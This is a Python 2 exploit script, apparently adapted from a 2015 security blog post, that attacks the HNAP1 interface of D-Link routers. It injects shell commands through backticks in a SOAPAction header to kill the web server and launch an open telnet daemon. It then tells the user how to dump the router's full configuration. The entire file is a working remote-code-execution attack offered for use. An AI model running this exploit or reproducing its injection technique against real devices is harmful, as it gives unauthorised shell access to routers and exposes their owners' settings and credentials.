#!/usr/bin/env python
# from: http://www.devttys0.com/2015/04/hacking-the-d-link-dir-890l/ 
import sys
import urllib2
import httplib
 
try:
    ip_port = sys.argv[1].split(':')
    ip = ip_port[0]
 
    if len(ip_port) == 2:
        port = ip_port[1]
    elif len(ip_port) == 1:
        port = "80"
    else:
        raise IndexError
except IndexError:
    print "Usage: %s <target ip:port>" % sys.argv[0]
    sys.exit(1)
 
url = "http://%s:%s/HNAP1" % (ip, port)
# NOTE: If exploiting from the LAN, telnetd can be started on
#       any port; killing the http server and re-using its port
#       is not necessary.
#
#       Killing off all hung hnap processes ensures that we can
#       re-start httpd later.
command = "killall httpd; killall hnap; telnetd -p %s" % port
headers = {
            "SOAPAction"    : '"http://purenetworks.com/HNAP1/GetDeviceSettings/`%s`"' % command,
          }
 
req = urllib2.Request(url, None, headers)
try:
    urllib2.urlopen(req)
    raise Exception("Unexpected response")
except httplib.BadStatusLine:
    print "Exploit sent, try telnetting to %s:%s!" % (ip, port)
    print "To dump all system settings, run (no quotes): 'xmldbc -d /var/config.xml; cat /var/config.xml'"
    sys.exit(0)
except Exception:
    print "Received an unexpected response from the server; exploit probably failed. :("
